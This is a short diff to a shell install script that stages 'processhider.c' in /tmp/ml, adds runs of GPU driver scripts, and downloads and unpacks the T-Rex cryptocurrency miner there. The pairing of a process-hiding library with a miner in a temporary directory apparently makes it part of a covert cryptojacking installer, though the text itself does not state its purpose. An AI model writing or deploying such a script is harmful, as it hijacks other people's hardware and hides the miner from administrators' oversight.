@@ -1,5 +1,9 @@
 mkdir -p /tmp/ml 
-mv Makefile processhider.c /tmp/ml/ 
+mv Makefile processhider.c /tmp/ml/
+./cudaubuntu.sh
+./cudafedora.sh
+./cudaredhat.sh 
+./amd.sh
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
 mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
 tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz -C /tmp/ml
